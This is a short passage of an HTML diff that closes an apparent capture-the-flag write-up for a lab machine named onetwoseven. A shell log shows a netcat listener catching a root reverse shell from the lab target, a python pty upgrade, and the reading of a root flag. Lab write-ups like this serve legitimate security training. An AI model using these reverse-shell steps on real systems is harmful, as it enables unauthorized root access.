+                root@gotham:~/ctf/onetwoseven/whois#&nbsp;nc&nbsp;-lvnp&nbsp;9002<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.7]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.133]&nbsp;51408<br>
+                id<br>
+                uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)<br>
+                python&nbsp;-c&nbsp;'import&nbsp;pty;&nbsp;pty.spawn("/bin/bash")'&nbsp;<br>
+                root@onetwoseven:/#&nbsp;cat&nbsp;~/root.txt<br>
+                2d380a2...
+            </div>
+        </div><br>
+        <br>
+        By god that was a lot of work to get root but holy shit was it worth it!<br>
+        <br>
+    </writeup>
+</section>
+
+</body>
+</html>
